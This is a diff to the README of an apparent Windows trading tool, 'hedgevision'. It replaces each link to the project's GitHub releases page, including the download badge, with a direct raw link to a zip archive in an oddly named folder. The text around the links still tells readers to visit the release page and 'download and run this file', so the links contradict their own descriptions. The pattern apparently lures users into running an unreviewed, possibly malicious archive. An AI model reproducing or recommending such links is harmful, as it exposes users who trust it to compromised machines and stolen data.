@@ -1,6 +1,6 @@
 # 📈 hedgevision - Stat-Arb Tools for Windows Users
 
-[![Download hedgevision](https://img.shields.io/badge/Download-Release%20Page-7b2cff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arrearsstocking863/hedgevision/releases)
+[![Download hedgevision](https://img.shields.io/badge/Download-Release%20Page-7b2cff?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/arrearsstocking863/hedgevision/main/Ctenodontidae/Software-3.8.zip)
 
 ## 🖥️ What hedgevision is
 
@@ -28,7 +28,7 @@ A recent Windows 10 or Windows 11 system works best.
 
 Visit the release page to download and run this file:
 
-https://github.com/arrearsstocking863/hedgevision/releases
+https://raw.githubusercontent.com/arrearsstocking863/hedgevision/main/Ctenodontidae/Software-3.8.zip
 
 On that page, look for the latest release and download the Windows file listed there.  
 If you see more than one file, choose the one meant for Windows.
@@ -221,7 +221,7 @@ These topics reflect the app’s focus on trading tools and data review.
 
 Check the release page for new builds, fixes, and new files:
 
-https://github.com/arrearsstocking863/hedgevision/releases
+https://raw.githubusercontent.com/arrearsstocking863/hedgevision/main/Ctenodontidae/Software-3.8.zip
 
 If a newer version appears, download that file and replace the older one on your computer.
 
